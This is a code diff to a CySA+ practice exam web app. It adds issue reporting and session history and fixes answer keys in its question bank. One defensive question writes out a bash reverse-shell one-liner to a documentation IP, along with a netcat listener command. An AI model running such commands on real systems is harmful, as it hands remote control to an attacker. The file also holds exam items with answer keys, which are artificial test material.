@@ -278,6 +278,52 @@ input,select,textarea{font-size:16px} /* prevent iOS zoom */
   img,svg,canvas,video{max-width:100%;height:auto}
 }
 
+
+/* Report issue sheet, history cards, session detail */
+.report-btn{border:1px solid var(--line);background:transparent;color:var(--muted);padding:6px 10px;border-radius:8px;font-size:13px}
+.report-btn:hover{border-color:var(--brand2);color:var(--ink)}
+.q-report{margin:8px 0 4px}
+.sheet-backdrop{position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:80}
+.sheet{
+  position:fixed;left:0;right:0;bottom:0;z-index:81;
+  max-height:min(85vh,640px);overflow:auto;-webkit-overflow-scrolling:touch;
+  background:var(--panel);color:var(--ink);
+  border-radius:16px 16px 0 0;
+  padding:16px 14px calc(16px + env(safe-area-inset-bottom));
+  box-shadow:0 -8px 32px rgba(0,0,0,.25);max-width:100vw
+}
+.sheet h3{margin:0 0 10px;font-size:1.1rem}
+.sheet .reasons{display:flex;flex-direction:column;gap:8px;margin:8px 0 12px}
+.sheet .reasons label{display:flex;gap:8px;align-items:flex-start;min-height:44px;padding:8px 10px;border:1px solid var(--line);border-radius:8px;background:var(--bg)}
+.sheet .sug-opts{display:flex;flex-direction:column;gap:6px;margin:6px 0 10px}
+.sheet .sug-opts label{display:flex;gap:8px;align-items:flex-start;padding:8px 10px;border:1px solid var(--line);border-radius:8px;background:var(--bg);overflow-wrap:anywhere}
+.hist-list{display:flex;flex-direction:column;gap:8px;margin-top:12px}
+.hist-item{
+  display:flex;justify-content:space-between;align-items:center;gap:10px;
+  width:100%;text-align:left;border:1px solid var(--line);border-radius:10px;
+  background:var(--bg);padding:12px;color:var(--ink)
+}
+.hist-item:hover{border-color:var(--brand2)}
+.hist-item .score{font-size:20px;font-weight:800;line-height:1.1}
+.hist-item .meta{font-size:13px;color:var(--muted);overflow-wrap:anywhere;min-width:0}
+.report-list{display:flex;flex-direction:column;gap:10px;margin-top:12px}
+.report-card{border:1px solid var(--line);border-radius:10px;padding:12px;background:var(--bg);overflow-wrap:anywhere}
+.session-q{border-top:1px solid var(--line);padding:12px 0;max-width:100%}
+.session-q .ansline{font-size:13px;margin:4px 0;white-space:pre-wrap;overflow-wrap:anywhere}
+.explainer-toggle{margin:8px 0}
+@media(min-width:769px){
+  .sheet{
+    left:50%;right:auto;bottom:auto;top:50%;transform:translate(-50%,-50%);
+    width:min(480px,92vw);border-radius:12px;max-height:80vh;
+    padding:18px;box-shadow:0 12px 40px rgba(0,0,0,.28)
+  }
+}
+@media(max-width:768px){
+  .report-btn{min-height:44px}
+  .hist-item{min-height:56px;flex-wrap:wrap;align-items:flex-start}
+  .sheet label.field > textarea{min-height:88px}
+}
+
 /* Desktop: keep classic side navigator; hide mobile chrome */
 @media(min-width:769px){
   .nav-toggle,.nav-backdrop,.bottombar,.topbar-menu{display:none !important}
@@ -305,6 +351,7 @@ input,select,textarea{font-size:16px} /* prevent iOS zoom */
       <button type="button" class="btn ghost icon-btn" id="menuBtn" aria-label="Menu" title="Menu">☰</button>
       <div class="menu-panel" id="menuPanel">
         <button type="button" class="btn" id="themeBtnMobile">Theme</button>
+        <button type="button" class="btn" id="reportsBtnMobile">Reported issues</button>
         <button type="button" class="btn hidden" id="reviewBtnMobile">Review & Submit</button>
         <button type="button" class="btn hidden" id="endBtnMobile">End / Submit</button>
       </div>
@@ -2002,7 +2049,7 @@ const BANK = {
         "Containers share the host OS kernel, while each VM runs its own guest OS on a hypervisor"
       ],
       "answer": [
-        2
+        3
       ],
       "optionExplanations": [
         "Containers don't run a hypervisor per application; they're isolated processes on a shared kernel.",
@@ -2010,7 +2057,7 @@ const BANK = {
         "Only containers use Linux namespaces and cgroups; VMs rely on hardware virtualization, which is a stronger boundary.",
         "The shared kernel makes containers lightweight, but a kernel exploit can affect every container on the host, whereas VMs are separated by the hypervisor."
       ],
-      "explanation": "Why this is correct:\nContainers isolate processes with namespaces and cgroups on one shared host kernel, so they are fast and small but have a thinner boundary. VMs virtualize hardware, and each runs a full guest OS and kernel under a hypervisor. That's why high-risk multi-tenant workloads often run containers inside VMs or sandboxed runtimes like gVisor or Kata.\n\nWhy the others are wrong:\n• \"Containers each run a dedicated hypervisor for stronger isolation\" — Containers don't run a hypervisor per application; they're isolated processes on a shared kernel.\n• \"VMs share a single kernel across all guests on the host\" — Each VM boots its own kernel; sharing one kernel describes containers.\n• \"Containers share the host OS kernel, while each VM runs its own guest…\" — The shared kernel makes containers lightweight, but a kernel exploit can affect every container on the host, whereas VMs are separated by the hypervisor.\n\nExam tip / key takeaway: Container = shared kernel (lighter, weaker isolation); VM = own kernel on a hypervisor (heavier, stronger isolation).\n\nReference: CS0-004 Obj 1.1 (Containerization) | Course 4.1.4 Containerization",
+      "explanation": "Why this is correct:\nContainers isolate processes with namespaces and cgroups on one shared host kernel, so they are fast and small but have a thinner boundary. VMs virtualize hardware, and each runs a full guest OS and kernel under a hypervisor. That's why high-risk multi-tenant workloads often run containers inside VMs or sandboxed runtimes like gVisor or Kata.\n\nWhy the others are wrong:\n• \"Containers each run a dedicated hypervisor for stronger isolation\" — Containers don't run a hypervisor per application; they're isolated processes on a shared kernel.\n• \"VMs share a single kernel across all guests on the host\" — Each VM boots its own kernel; sharing one kernel describes containers.\n• \"Containers and VMs provide identical isolation because both use namespaces\" — Only containers use Linux namespaces and cgroups; VMs rely on hardware virtualization, which is a stronger boundary.\n\nExam tip / key takeaway: Container = shared kernel (lighter, weaker isolation); VM = own kernel on a hypervisor (heavier, stronger isolation).\n\nReference: CS0-004 Obj 1.1 (Containerization) | Course 4.1.4 Containerization",
       "domain": 1,
       "domainName": "Security Operations",
       "objective": "1.1",
@@ -2789,7 +2836,7 @@ const BANK = {
         "A deduplication job rewriting file blocks"
       ],
       "answer": [
-        1
+        2
       ],
       "optionExplanations": [
         "Shadow copies don't rename user files, and ransomware usually deletes them.",
@@ -2797,7 +2844,7 @@ const BANK = {
         "Rapid storage growth plus mass renaming to a new extension like .locked is the signature of ransomware encryption.",
         "Deduplication reduces disk usage and never changes file extensions."
       ],
-      "explanation": "Why this is correct:\nRansomware typically reads each file, writes an encrypted copy (often with a new extension such as .locked), and deletes or overwrites the original, causing sudden spikes in disk I/O and usage. Mass extension changes across many files are among the most reliable resource and file-system indicators.\n\nWhy the others are wrong:\n• \"Volume Shadow Copy snapshots consuming free space\" — Shadow copies don't rename user files, and ransomware usually deletes them.\n• \"Ransomware encrypting files and writing new encrypted copies\" — Rapid storage growth plus mass renaming to a new extension like .locked is the signature of ransomware encryption.\n• \"A deduplication job rewriting file blocks\" — Deduplication reduces disk usage and never changes file extensions.\n\nExam tip / key takeaway: Sudden disk/IO spike + mass new extension + ransom notes = ransomware; isolate immediately.\n\nReference: CS0-004 Obj 1.2 (Resource consumption) | Course 10.2.2 Anomalous System Behavior",
+      "explanation": "Why this is correct:\nRansomware typically reads each file, writes an encrypted copy (often with a new extension such as .locked), and deletes or overwrites the original, causing sudden spikes in disk I/O and usage. Mass extension changes across many files are among the most reliable resource and file-system indicators.\n\nWhy the others are wrong:\n• \"Volume Shadow Copy snapshots consuming free space\" — Shadow copies don't rename user files, and ransomware usually deletes them.\n• \"A backup agent staging files before upload\" — Backup staging doesn't rename production files with a new extension.\n• \"A deduplication job rewriting file blocks\" — Deduplication reduces disk usage and never changes file extensions.\n\nExam tip / key takeaway: Sudden disk/IO spike + mass new extension + ransom notes = ransomware; isolate immediately.\n\nReference: CS0-004 Obj 1.2 (Resource consumption) | Course 10.2.2 Anomalous System Behavior",
       "domain": 1,
       "domainName": "Security Operations",
       "objective": "1.2",
@@ -2975,7 +3022,7 @@ const BANK = {
         "AnyDesk can't be monitored, so no logs will ever exist"
       ],
       "answer": [
-        3
+        2
       ],
       "optionExplanations": [
         "Licensing is a side issue; unauthorized remote access is the security concern.",
@@ -2983,7 +3030,7 @@ const BANK = {
         "Legitimate RMM tools are widely abused (ATT&CK T1219) by ransomware operators and tech-support scammers because they're signed, trusted, and blend in.",
         "AnyDesk does leave logs (ad.trace, connection_trace.txt) that analysts can examine."
       ],
-      "explanation": "Why this is correct:\nUnauthorized software, especially remote access/RMM tools, gives attackers persistence and control that slip past many security tools because the binaries are legitimately signed. Fourteen accounting PCs (a target for wire fraud) with an unapproved tool calls for investigation of who installed it, when, and which sessions connected.\n\nWhy the others are wrong:\n• \"It mainly creates a software-licensing compliance problem\" — Licensing is a side issue; unauthorized remote access is the security concern.\n• \"Remote access tools always contain malware and must be quarantined\" — AnyDesk itself is legitimate software; the risk is unauthorized use, not built-in malware.\n• \"Unapproved remote access tools are often installed by attackers or…\" — Legitimate RMM tools are widely abused (ATT&CK T1219) by ransomware operators and tech-support scammers because they're signed, trusted, and blend in.\n\nExam tip / key takeaway: Unapproved RMM (AnyDesk, TeamViewer, ScreenConnect) = possible attacker persistence; enforce application allow-listing.\n\nReference: CS0-004 Obj 1.2 (Unauthorized software) | Course 10.2.4 System-Related Indicators of Compromise",
+      "explanation": "Why this is correct:\nUnauthorized software, especially remote access/RMM tools, gives attackers persistence and control that slip past many security tools because the binaries are legitimately signed. Fourteen accounting PCs (a target for wire fraud) with an unapproved tool calls for investigation of who installed it, when, and which sessions connected.\n\nWhy the others are wrong:\n• \"It mainly creates a software-licensing compliance problem\" — Licensing is a side issue; unauthorized remote access is the security concern.\n• \"Remote access tools always contain malware and must be quarantined\" — AnyDesk itself is legitimate software; the risk is unauthorized use, not built-in malware.\n• \"AnyDesk can't be monitored, so no logs will ever exist\" — AnyDesk does leave logs (ad.trace, connection_trace.txt) that analysts can examine.\n\nExam tip / key takeaway: Unapproved RMM (AnyDesk, TeamViewer, ScreenConnect) = possible attacker persistence; enforce application allow-listing.\n\nReference: CS0-004 Obj 1.2 (Unauthorized software) | Course 10.2.4 System-Related Indicators of Compromise",
       "domain": 1,
       "domainName": "Security Operations",
       "objective": "1.2",
@@ -3798,7 +3845,7 @@ const BANK = {
         "http.request.method == \"POST\""
       ],
       "answer": [
-        2
+        3
       ],
       "optionExplanations": [
         "That's BPF-style capture syntax and isn't a valid display filter.",
@@ -3806,7 +3853,7 @@ const BANK = {
         "This finds packets containing \"GET\", the opposite of what's needed.",
         "This display filter matches HTTP requests whose method field is POST."
       ],
-      "explanation": "Why this is correct:\nWireshark display filters reference dissector fields. http.request.method holds the verb of each HTTP request, so http.request.method == \"POST\" isolates form submissions, uploads, and many C2 check-ins, which is useful for spotting credential posting or exfiltration in cleartext HTTP.\n\nWhy the others are wrong:\n• \"host http and method post\" — That's BPF-style capture syntax and isn't a valid display filter.\n• \"tcp.port == 443 && post\" — \"post\" isn't a field, and traffic on 443 is usually TLS-encrypted, so HTTP methods aren't visible.\n• \"http.request.method == \"POST\"\" — This display filter matches HTTP requests whose method field is POST.\n\nExam tip / key takeaway: Display filter field for HTTP verbs: http.request.method; for a host: ip.addr; for a port: tcp.port.\n\nReference: CS0-004 Obj 1.3 (Wireshark) | Course 10.3.8 Wireshark",
+      "explanation": "Why this is correct:\nWireshark display filters reference dissector fields. http.request.method holds the verb of each HTTP request, so http.request.method == \"POST\" isolates form submissions, uploads, and many C2 check-ins, which is useful for spotting credential posting or exfiltration in cleartext HTTP.\n\nWhy the others are wrong:\n• \"host http and method post\" — That's BPF-style capture syntax and isn't a valid display filter.\n• \"tcp.port == 443 && post\" — \"post\" isn't a field, and traffic on 443 is usually TLS-encrypted, so HTTP methods aren't visible.\n• \"http contains GET\" — This finds packets containing \"GET\", the opposite of what's needed.\n\nExam tip / key takeaway: Display filter field for HTTP verbs: http.request.method; for a host: ip.addr; for a port: tcp.port.\n\nReference: CS0-004 Obj 1.3 (Wireshark) | Course 10.3.8 Wireshark",
       "domain": 1,
       "domainName": "Security Operations",
       "objective": "1.3",
@@ -3984,7 +4031,7 @@ const BANK = {
         "Downloads a file from 198.51.100.20 over HTTPS"
       ],
       "answer": [
-        0
+        2
       ],
       "optionExplanations": [
         "It does open a connection, but then attaches an interactive shell to it rather than just testing reachability.",
@@ -3992,7 +4039,7 @@ const BANK = {
         "bash -i runs an interactive shell with stdout/stderr (>&) and stdin (0>&1) redirected to a TCP socket, handing control to the remote listener.",
         "No file is fetched or saved; there's no curl, wget, or output file."
       ],
-      "explanation": "Why this is correct:\nBash's /dev/tcp/\u003chost>/\u003cport> pseudo-device opens a TCP connection. Redirecting an interactive shell's input and output to it creates a reverse shell: the victim connects out to the attacker's listener (nc -lvnp 443), which slips past inbound firewall rules. Port 443 is chosen to blend in with HTTPS.\n\nWhy the others are wrong:\n• \"Starts a bind shell listening on local port 443\" — A bind shell listens locally; /dev/tcp/host/port makes an outbound connection.\n• \"Opens an interactive reverse shell to 198.51.100.20 on port 443\" — bash -i runs an interactive shell with stdout/stderr (>&) and stdin (0>&1) redirected to a TCP socket, handing control to the remote listener.\n• \"Downloads a file from 198.51.100.20 over HTTPS\" — No file is fetched or saved; there's no curl, wget, or output file.\n\nExam tip / key takeaway: bash -i >& /dev/tcp/IP/PORT 0>&1 = reverse shell (outbound); a bind shell listens locally instead.\n\nReference: CS0-004 Obj 1.3 (Interpreting suspicious commands) | Course 11.3.4 Suspicious Command Interpretation",
+      "explanation": "Why this is correct:\nBash's /dev/tcp/\u003chost>/\u003cport> pseudo-device opens a TCP connection. Redirecting an interactive shell's input and output to it creates a reverse shell: the victim connects out to the attacker's listener (nc -lvnp 443), which slips past inbound firewall rules. Port 443 is chosen to blend in with HTTPS.\n\nWhy the others are wrong:\n• \"Tests whether outbound port 443 is open with a TCP ping\" — It does open a connection, but then attaches an interactive shell to it rather than just testing reachability.\n• \"Starts a bind shell listening on local port 443\" — A bind shell listens locally; /dev/tcp/host/port makes an outbound connection.\n• \"Downloads a file from 198.51.100.20 over HTTPS\" — No file is fetched or saved; there's no curl, wget, or output file.\n\nExam tip / key takeaway: bash -i >& /dev/tcp/IP/PORT 0>&1 = reverse shell (outbound); a bind shell listens locally instead.\n\nReference: CS0-004 Obj 1.3 (Interpreting suspicious commands) | Course 11.3.4 Suspicious Command Interpretation",
       "domain": 1,
       "domainName": "Security Operations",
       "objective": "1.3",
@@ -5223,10 +5270,10 @@ const BANK = {
         "Domain names",
         "Network/host artifacts",
         "IP addresses",
-        "TTPs for hosts that match the same policy baseline"
+        "TTPs (tactics, techniques, and procedures)"
       ],
       "answer": [
-        1
+        3
       ],
       "optionExplanations": [
         "Domains are fairly cheap and quick to replace.",
@@ -5234,7 +5281,7 @@ const BANK = {
         "Attackers can switch IPs easily.",
         "TTPs (tactics, techniques, and procedures) are at the top: changing how an adversary operates is costly and slow."
       ],
-      "explanation": "Why this is correct:\nThe Pyramid of Pain shows that detections based on behavior (TTPs) impose the most cost on adversaries because they have to retrain, retool, and change their procedures. Hash- or IP-based blocks are bypassed within hours.\n\nWhy the others are wrong:\n• \"Domain names\" — Domains are fairly cheap and quick to replace.\n• \"IP addresses\" — Attackers can switch IPs easily.\n• \"TTPs for hosts that match the same policy baseline\" — TTPs (tactics, techniques, and procedures) are at the top: changing how an adversary operates is costly and slow.\n\nExam tip / key takeaway: Top of the Pyramid of Pain = TTPs, the most painful for adversaries when detected.\n\nReference: CS0-004 Obj 1.4 (Pyramid of Pain) | Course 6.1.4 Pyramid of Pain",
+      "explanation": "Why this is correct:\nThe Pyramid of Pain shows that detections based on behavior (TTPs) impose the most cost on adversaries because they have to retrain, retool, and change their procedures. Hash- or IP-based blocks are bypassed within hours.\n\nWhy the others are wrong:\n• \"Domain names\" — Domains are fairly cheap and quick to replace.\n• \"Network/host artifacts\" — Artifacts are moderately painful to change but sit below tools and TTPs.\n• \"IP addresses\" — Attackers can switch IPs easily.\n\nExam tip / key takeaway: Top of the Pyramid of Pain = TTPs, the most painful for adversaries when detected.\n\nReference: CS0-004 Obj 1.4 (Pyramid of Pain) | Course 6.1.4 Pyramid of Pain",
       "domain": 1,
       "domainName": "Security Operations",
       "objective": "1.4",
@@ -5288,7 +5335,7 @@ const BANK = {
         "Defense Evasion"
       ],
       "answer": [
-        3
+        2
       ],
       "optionExplanations": [
         "Lateral Movement is about reaching other systems, not keeping access to the current one.",
@@ -5296,7 +5343,7 @@ const BANK = {
         "Persistence techniques (Run keys, services, scheduled tasks, new accounts) keep access across reboots and credential changes.",
         "Defense Evasion is about avoiding detection, which is related but a different goal."
       ],
-      "explanation": "Why this is correct:\nATT&CK Persistence (TA0003) covers techniques that keep a foothold after interruptions such as reboots, logoffs, or password resets: autostart registry keys, services, scheduled tasks, web shells, backdoor accounts, and SSH authorized_keys.\n\nWhy the others are wrong:\n• \"Lateral Movement\" — Lateral Movement is about reaching other systems, not keeping access to the current one.\n• \"Privilege Escalation\" — Privilege Escalation is about gaining higher permissions, not surviving restarts.\n• \"Persistence\" — Persistence techniques (Run keys, services, scheduled tasks, new accounts) keep access across reboots and credential changes.\n\nExam tip / key takeaway: \"Survive reboots / credential changes\" = Persistence (TA0003).\n\nReference: CS0-004 Obj 1.4 (MITRE ATT&CK (TTPs)) | Course 6.1.3 Tactics, Techniques, and Procedures",
+      "explanation": "Why this is correct:\nATT&CK Persistence (TA0003) covers techniques that keep a foothold after interruptions such as reboots, logoffs, or password resets: autostart registry keys, services, scheduled tasks, web shells, backdoor accounts, and SSH authorized_keys.\n\nWhy the others are wrong:\n• \"Lateral Movement\" — Lateral Movement is about reaching other systems, not keeping access to the current one.\n• \"Privilege Escalation\" — Privilege Escalation is about gaining higher permissions, not surviving restarts.\n• \"Defense Evasion\" — Defense Evasion is about avoiding detection, which is related but a different goal.\n\nExam tip / key takeaway: \"Survive reboots / credential changes\" = Persistence (TA0003).\n\nReference: CS0-004 Obj 1.4 (MITRE ATT&CK (TTPs)) | Course 6.1.3 Tactics, Techniques, and Procedures",
       "domain": 1,
       "domainName": "Security Operations",
       "objective": "1.4",
@@ -17506,13 +17553,31 @@ function storageAvailable(){
   try { const k='__t'; localStorage.setItem(k,'1'); localStorage.removeItem(k); return true; } catch { return false; }
 }
 const HAS_STORE = storageAvailable();
+function emptyStore(){ return {history:[], missed:{}, stats:{}}; }
+function normalizeStore(s){
+  if (!s || typeof s!=='object' || Array.isArray(s)) return emptyStore();
+  return {
+    history: Array.isArray(s.history) ? s.history : [],
+    missed: (s.missed && typeof s.missed==='object' && !Array.isArray(s.missed)) ? s.missed : {},
+    stats: (s.stats && typeof s.stats==='object' && !Array.isArray(s.stats)) ? s.stats : {}
+  };
+}
 function loadStore(){
-  if (!HAS_STORE) return {history:[], missed:{}, stats:{}};
-  try { return JSON.parse(localStorage.getItem(STORE_KEY)) || {history:[], missed:{}, stats:{}}; }
-  catch { return {history:[], missed:{}, stats:{}}; }
+  if (!HAS_STORE) return emptyStore();
+  try { return normalizeStore(JSON.parse(localStorage.getItem(STORE_KEY)) || emptyStore()); }
+  catch { return emptyStore(); }
 }
 function saveStore(s){ if (HAS_STORE) try{ localStorage.setItem(STORE_KEY, JSON.stringify(s)); }catch{} }
 let store = loadStore();
+
+const REPORTS_KEY = 'cysa004_reports_v1';
+function loadReports(){
+  if (!HAS_STORE) return [];
+  try { const r=JSON.parse(localStorage.getItem(REPORTS_KEY)); return Array.isArray(r)?r:[]; }
+  catch { return []; }
+}
+function saveReports(list){ if (HAS_STORE) try{ localStorage.setItem(REPORTS_KEY, JSON.stringify(list)); }catch{} }
+let reports = loadReports();
 
 function $(sel, el=document){ return el.querySelector(sel); }
 function el(html){ const t=document.createElement('template'); t.innerHTML=html.trim(); return t.content.firstChild; }
@@ -17564,7 +17629,7 @@ function scoreItem(q, user){
   // PBQ partial credit
   let earned=0, possible=0; const taskResults=[];
   (q.tasks||[]).forEach((t,i)=>{
-    const ua = (user && user[i]) || null;
+    const ua = (user && user[i] !== undefined) ? user[i] : null;
     const p = t.points || 1; possible += p;
     let e=0;
     if (t.kind==='choice'){ e = (ua===t.answer)?p:0; }
@@ -17607,6 +17672,7 @@ setTheme((HAS_STORE && localStorage.getItem('cysa_theme')) || 'light');
 function toggleTheme(){ setTheme(document.documentElement.getAttribute('data-theme')==='dark'?'light':'dark'); }
 $('#themeBtn').onclick = toggleTheme;
 $('#themeBtnMobile').onclick = ()=>{ toggleTheme(); $('#topMenu').classList.remove('open'); };
+$('#reportsBtnMobile').onclick = ()=>{ $('#topMenu').classList.remove('open'); renderReports(); };
 $('#menuBtn').onclick = (e)=>{ e.stopPropagation(); $('#topMenu').classList.toggle('open'); };
 document.addEventListener('click', (e)=>{
   const m=$('#topMenu');
@@ -17650,6 +17716,7 @@ function goHome(){
 }
 
 function renderHome(){
+  window.scrollTo(0,0);
   const hist = store.history.slice(-8).reverse();
   const view = $('#view');
   view.classList.add('home-view');
@@ -17687,27 +17754,66 @@ function renderHome(){
 
   view.appendChild(el(`<div class="card"><h3 style="margin-top:0">History & data</h3>
     <div class="toolbar">
+      <button class="btn" id="reportsBtn">Reported issues${reports.length?` (${reports.length})`:''}</button>
+      <button class="btn" id="allHistBtn">All sessions</button>
       <button class="btn" id="exportBtn">Export JSON</button>
       <button class="btn" id="importBtn">Import JSON</button>
       <button class="btn danger" id="resetBtn">Reset history</button>
       <input type="file" id="importFile" accept="application/json" class="hidden" />
     </div>
-    ${hist.length?`<div class="table-wrap" style="margin-top:12px"><table class="table"><thead><tr><th>When</th><th>Mode</th><th>Score</th><th>Result</th></tr></thead><tbody>
-      ${hist.map(h=>`<tr><td>${esc(h.whenLocal)}</td><td>${esc(h.mode)}</td><td>${h.scaled}</td><td class="${h.pass?'pass':'fail'}">${h.pass?'PASS':'FAIL'}</td></tr>`).join('')}
-    </tbody></table></div>`:'<p class="muted">No attempts yet.</p>'}
+    ${hist.length?`<div class="hist-list" id="histList"></div>
+      <p class="footerhint">Tap a session to see which questions you missed. Older sessions from before this update may not have question details.</p>`
+      :'<p class="muted">No attempts yet.</p>'}
     <p class="footerhint">Scaled scoring: percent correct maps linearly to 100–900; PBQs use partial credit and a small bonus when PBQ accuracy exceeds overall accuracy. Pass = 750. CompTIA's proprietary curve is not public — this is a transparent practice approximation.</p>
   </div>`));
 
+  if (hist.length){
+    const host=$('#histList');
+    hist.forEach(h=>{
+      const idx=store.history.indexOf(h);
+      host.appendChild(histCard(h, idx));
+    });
+  }
+  $('#reportsBtn').onclick = ()=> renderReports();
+  $('#allHistBtn').onclick = ()=> renderHistoryList();
   $('#exportBtn').onclick = ()=>{
     const blob = new Blob([JSON.stringify(store,null,2)], {type:'application/json'});
     const a=document.createElement('a'); a.href=URL.createObjectURL(blob); a.download='cysa_practice_history.json'; a.click();
   };
-  $('#resetBtn').onclick = ()=>{ if(confirm('Reset all history and missed-question stats?')){ store={history:[],missed:{},stats:{}}; saveStore(store); renderHome(); } };
+  $('#resetBtn').onclick = ()=>{ if(confirm('Reset all history and missed-question stats? Reported issues are kept.')){ store=emptyStore(); saveStore(store); renderHome(); } };
   $('#importBtn').onclick = ()=> $('#importFile').click();
   $('#importFile').onchange = async (e)=>{
     const f=e.target.files[0]; if(!f) return;
-    store = JSON.parse(await f.text()); saveStore(store); renderHome();
+    try {
+      store = normalizeStore(JSON.parse(await f.text()));
+      saveStore(store); renderHome();
+    } catch { alert('Could not import that file. It should be a history JSON export from this app.'); }
   };
+}
+function histCard(h, idx){
+  const b=el(`<button type="button" class="hist-item">
+    <div>
+      <div class="score ${h.pass?'pass':'fail'}">${h.scaled}</div>
+      <div class="${h.pass?'pass':'fail'}" style="font-size:12px;font-weight:700">${h.pass?'PASS':'FAIL'}</div>
+    </div>
+    <div class="meta"><b>${esc(h.mode)}</b> · ${h.count||'?'} questions<br>${esc(h.whenLocal||h.when||'')}</div>
+  </button>`);
+  b.onclick=()=> renderHistoryDetail(idx);
+  return b;
+}
+function beginAuxView(title){
+  window.scrollTo(0,0);
+  const bb=$('#bottombar'); if(bb) bb.remove();
+  setEndVisible(!!(state && state.items));
+  $('#modePill').textContent=title;
+  const view=$('#view');
+  view.innerHTML='';
+  view.classList.add('home-view');
+  return view;
+}
+function backFromAux(){
+  if (state && state.items) renderExam();
+  else goHome();
 }
 function modeCard(title, desc, mode){
   const c = el(`<div class="card"><h3 style="margin-top:0">${title}</h3><p class="muted">${desc}</p><button class="btn primary">Start</button></div>`);
@@ -17716,6 +17822,7 @@ function modeCard(title, desc, mode){
 }
 
 function setupMode(mode){
+  window.scrollTo(0,0);
   const view=$('#view'); view.innerHTML='';
   view.classList.add('home-view');
   const _bb=$('#bottombar'); if(_bb) _bb.remove();
@@ -17884,6 +17991,7 @@ function renderExam(){
     ${it.flagged?'<span class="tag">FLAGGED</span>':''}
   </h2>`));
   qcard.appendChild(el(`<div class="stem">${esc(q.question || q.title || '')}</div>`));
+  qcard.appendChild(reportButton(q));
   if (q.type==='pbq') renderPBQ(qcard, it);
   else renderMC(qcard, it);
 
@@ -18044,6 +18152,7 @@ function renderPBQ(qcard, it){
 }
 
 function renderReview(){
+  window.scrollTo(0,0);
   const view=$('#view'); view.innerHTML='';
   view.classList.remove('home-view');
   const bb=$('#bottombar'); if(bb) bb.remove();
@@ -18071,7 +18180,24 @@ function finishExam(auto){
   // update store
   const when = new Date();
   const whenLocal = when.toLocaleString('en-US',{timeZone:'America/New_York'});
-  store.history.push({when:when.toISOString(), whenLocal: whenLocal+' ET', mode:state.mode, scaled:result.scaled, pass:result.pass, pct:+result.pct.toFixed(1), count:state.items.length, elapsed});
+  store.history.push({
+    when:when.toISOString(),
+    whenLocal: whenLocal+' ET',
+    mode:state.mode,
+    scaled:result.scaled,
+    pass:result.pass,
+    pct:+result.pct.toFixed(1),
+    count:state.items.length,
+    elapsed,
+    items: result.details.map(d=>({
+      id:d.id,
+      user:d.user,
+      correct:!!d.correct,
+      earned:d.earned,
+      possible:d.possible,
+      q:d.q
+    }))
+  });
   result.details.forEach(d=>{
     const st=store.stats[d.id]=store.stats[d.id]||{seen:0, correct:0};
     st.seen++; if (d.correct) st.correct++;
@@ -18088,6 +18214,7 @@ function finishExam(auto){
 }
 
 function renderResults(result, elapsed, auto){
+  window.scrollTo(0,0);
   const view=$('#view'); view.innerHTML='';
   view.classList.remove('home-view');
   const _bb=$('#bottombar'); if(_bb) _bb.remove();
@@ -18142,6 +18269,7 @@ function renderResults(result, elapsed, auto){
           ${isFlag?'<span class="tag">FLAGGED</span>':''}</div>
         <div class="stem" style="font-size:14px;margin:8px 0">${esc(d.q.question||d.q.title||'')}</div>
       </div>`);
+      wrap.appendChild(reportButton(d.q));
       wrap.insertAdjacentHTML('beforeend', formatExplainerHtml(d.q, d.user, d));
       host.appendChild(wrap);
     });
@@ -18273,7 +18401,241 @@ function formatExplanationBody(raw){
 }
 
 
+function reportButton(q){
+  const wrap=el(`<div class="q-report"><button type="button" class="report-btn">Report issue</button></div>`);
+  wrap.querySelector('button').onclick=(e)=>{ e.preventDefault(); e.stopPropagation(); openReportSheet(q); };
+  return wrap;
+}
+function questionSnapshot(q){
+  return {
+    stem: q.question || q.title || '',
+    type: q.type,
+    options: (q.type==='single'||q.type==='multi') ? (q.options||[]).slice() : null,
+    key: (q.type==='single'||q.type==='multi') ? (q.answer||[]).slice() : formatAnswer(q)
+  };
+}
+function closeSheet(){
+  const bd=$('#sheetBackdrop'); if(bd) bd.remove();
+  const sh=$('#issueSheet'); if(sh) sh.remove();
+  document.body.style.overflow='';
+}
+function openReportSheet(q){
+  if (!q) return;
+  closeSheet();
+  document.body.style.overflow='hidden';
+  const backdrop=el(`<div class="sheet-backdrop" id="sheetBackdrop"></div>`);
+  backdrop.onclick=closeSheet;
+  let sug='';
+  if (q.type==='single' || q.type==='multi'){
+    const multi=q.type==='multi';
+    sug = `<div class="muted" style="font-size:13px;margin-top:8px">I think the answer is (optional)</div>
+      <div class="sug-opts">${(q.options||[]).map((opt,i)=>`<label><input type="${multi?'checkbox':'radio'}" name="sug" value="${i}"/> <span><b>${String.fromCharCode(65+i)}.</b> ${esc(opt)}</span></label>`).join('')}</div>`;
+  } else {
+    sug = `<label class="field">I think the answer is (optional)<textarea id="sugText" rows="3" placeholder="Describe what you think is correct"></textarea></label>`;
+  }
+  const sheet=el(`<div class="sheet" id="issueSheet" role="dialog" aria-modal="true" aria-labelledby="issueSheetTitle">
+    <h3 id="issueSheetTitle">Report an issue</h3>
+    <p class="muted" style="margin:0 0 10px;overflow-wrap:anywhere"><span class="tag">${esc(q.id||'')}</span> ${esc((q.question||q.title||'').slice(0,180))}</p>
+    <div class="muted" style="font-size:13px">Reason</div>
+    <div class="reasons">
+      <label><input type="radio" name="reason" value="wrong_key"/> Wrong answer key</label>
+      <label><input type="radio" name="reason" value="bad_explanation"/> Bad explanation</label>
+      <label><input type="radio" name="reason" value="unclear"/> Unclear question</label>
+      <label><input type="radio" name="reason" value="other"/> Other</label>
+    </div>
+    ${sug}
+    <label class="field">Note (optional)<textarea id="issueNote" rows="3" placeholder="What seems wrong?"></textarea></label>
+    <div class="toolbar" style="margin-top:12px">
+      <button type="button" class="btn" id="issueCancel">Cancel</button>
+      <button type="button" class="btn primary" id="issueSave">Save report</button>
+    </div>
+  </div>`);
+  document.body.append(backdrop, sheet);
+  $('#issueCancel').onclick=closeSheet;
+  $('#issueSave').onclick=()=>{
+    const reasonEl=sheet.querySelector('input[name=reason]:checked');
+    if (!reasonEl){ alert('Pick a reason first.'); return; }
+    let suggested=null;
+    if (q.type==='single'){
+      const r=sheet.querySelector('input[name=sug]:checked');
+      suggested = r ? [+r.value] : null;
+    } else if (q.type==='multi'){
+      const vals=[...sheet.querySelectorAll('input[name=sug]:checked')].map(x=>+x.value);
+      suggested = vals.length?vals:null;
+    } else {
+      const t=($('#sugText')&&$('#sugText').value||'').trim();
+      suggested = t||null;
+    }
+    reports.push({
+      id: 'r_'+Date.now().toString(36)+'_'+Math.random().toString(36).slice(2,8),
+      questionId: q.id,
+      when: new Date().toISOString(),
